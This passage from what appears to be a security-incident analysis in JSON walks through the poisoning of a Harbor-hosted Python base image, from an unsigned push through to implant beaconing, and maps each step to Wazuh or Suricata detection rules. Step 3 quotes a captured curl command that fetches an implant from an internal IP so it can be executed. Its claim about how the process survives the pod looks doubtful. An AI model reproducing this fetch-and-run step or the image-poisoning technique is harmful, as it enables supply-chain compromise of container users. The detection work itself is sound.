  ],
  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Implant Internal Image — Unsigned Push to Corp Registry", "technique": "T1525", "what_happened": "On 2027-06-08 02:14:08 CEST (14 DAYS before today's analyst pickup), the Harbor registry audit log on harbor-master-01 (agent.id=140, agent.ip=10.108.50.30) recorded a push event for tag corp.harbor.local/base/python:3.11. The push principal was the CI/CD service account svc_harbor_push. The push originated from data.srcip=10.108.57.193 — an internal IP that is NOT in the corp-CI-runner allowlist (legitimate svc_harbor_push pushes always originate from 10.108.50.42-46, the corp-CI-runner subnet). The pushed image had NO Cosign signature attached (no sibling .sig manifest in the OCI layout). The push REPLACED the same tag in place — the previous digest sha256:1b2c3d... was overwritten by the new digest sha256:f9e8d7c6b5a4938271605e4f3a2b1c8d6e7f49a3b8c25d1e0f7a6b9c4d3e2f10. This is the moment the actor poisoned the corp Python base image.", "chain_reason": "Wazuh custom rule 87701 'Harbor registry: unsigned image pushed to base/' fired with rule.mitre.id=T1525 on the Harbor audit-syslog event when (a) repository starts with 'base/', (b) operation='push', (c) cosign-signature-sibling-blob absent from the manifest layout, (d) source IP is not in corp-CI-runner allowlist. The composite signature has very low FP rate because legitimate corp pushes to base/ paths are exclusively automated by the CI pipeline from a fixed IP range and ALWAYS sign with the corp Cosign key.", "first_seen": "2027-06-08T02:14:08+0200"},
    {"step": 2, "tactic": "Persistence / OCI Manifest On-Disk Modification", "technique": "T1525", "what_happened": "At 02:14:11 CEST (3 seconds after the push event), Wazuh FIM (syscheck) on harbor-master-01 detected a modification to the on-disk OCI manifest under Harbor's storage backend: syscheck.path=/var/lib/registry/docker/registry/v2/repositories/base/python/_manifests/tags/3.11/current/link, syscheck.event='modified'. The link file (a Harbor-internal pointer to the active manifest digest) was overwritten from sha256:1b2c3d... to sha256:f9e8d7c6b5a4938271605e4f3a2b1c8d6e7f49a3b8c25d1e0f7a6b9c4d3e2f10. The previous digest was Cosign-signed (a sibling sha256:1b2c3d....sig blob existed); the new digest has NO Cosign signature — confirmed by absence of a corresponding sha256:f9e8d7c6....sig blob in /var/lib/registry/docker/registry/v2/blobs/.", "chain_reason": "Wazuh FIM rule 550 + custom rule 87702 'OCI manifest pointer changed without Cosign signature sibling' fired with rule.mitre.id=T1525 on the syscheck.path modification under the Harbor storage tree. The 3-second gap between the audit log event (step 1) and the FIM event (step 2) is the normal latency of Harbor writing the manifest to disk after API-level commit.", "first_seen": "2027-06-08T02:14:11+0200"},
    {"step": 3, "tactic": "Execution / Container ENTRYPOINT Beacon on Schedule", "technique": "T1059.004", "what_happened": "For 14 days following the poisoning (2027-06-08 02:14 → 2027-06-22 14:21), every new K8s pod scheduled from corp.harbor.local/base/python:3.11 executed the poisoned ENTRYPOINT /usr/local/bin/corp-init at container start. The first detection in the alert pickup window is at 2027-06-22 14:21:44 CEST when pod 'api-billing-7d4f8b9c-mn2pq' started on k8s-worker-08 (agent.id=148, agent.ip=10.108.71.8). Linux auditd on the worker captured: data.audit.exe=/bin/sh, data.audit.command='/bin/sh /usr/local/bin/corp-init python3', data.audit.uid=0 (root inside container, root-mapped on node), data.audit.ppid=4 (containerd-shim). The corp-init script then issued data.audit.exe=/usr/bin/curl, data.audit.command='curl -fsSL --max-time 10 http://10.108.57.193/implant -o /tmp/.sys_update_20270608_021408'. A second pod 'job-etl-cron-x8m4r' started on k8s-worker-14 at 14:24:33 with the IDENTICAL chain. The implant binary file /tmp/.sys_update_20270608_021408 was then made executable + spawned via nohup, surviving the container's main process.", "chain_reason": "Wazuh custom rule 92105 'New container workload beacons within 60s of start (HostAge<60s)' fired with rule.mitre.id=[T1525,T1059.004] when the auditd EXECVE chain on a K8s worker showed containerd-shim → /bin/sh → /usr/local/bin/corp-init → /usr/bin/curl within 60 seconds of the container's first PID. The literal-IP-in-command IoC ('curl ... http://10.108.57.193/implant') AND the binary drop path /tmp/.sys_update_<TS>-with-poisoning-timestamp-embedded are population-level fingerprints of the poisoned base image.", "first_seen": "2027-06-22T14:21:44+0200"},
    {"step": 4, "tactic": "Command and Control — External HTTPS Beacon by Persistent Implant", "technique": "T1071.001", "what_happened": "At 14:21:54 CEST (10s after the curl drop), the just-dropped implant /tmp/.sys_update_20270608_021408 (running under nohup, detached from the container's main pid) issued an outbound HTTPS connection from k8s-worker-08's egress NAT to data.dstip=192.166.218.45 data.dstport=443. Suricata signature 'ET POLICY External HTTPS connection from K8s worker — newly-spawned process' fired. Identical beacon from k8s-worker-14 at 14:24:43. Both nodes show repeated beaconing every ~120s thereafter through the alert window — the implant is now persistent at the node level (the /tmp file survives the container's lifecycle because nohup detached it from the container's process tree; on this cluster, /tmp is per-pod ephemeral storage BUT the nohup'd process runs in the node PID namespace which is shared, so the binary remains alive on the node even after the pod exits).", "chain_reason": "Wazuh custom rule 92106 'Long-lived process beacon from non-corp dst on K8s worker' fired with rule.mitre.id=[T1071.001,T1105] when Suricata logged ≥3 outbound HTTPS connections to the same external IP from the same K8s worker within 5 minutes, AND the source process auditd context matched a recently-spawned ENTRYPOINT chain.", "first_seen": "2027-06-22T14:21:54+0200"}
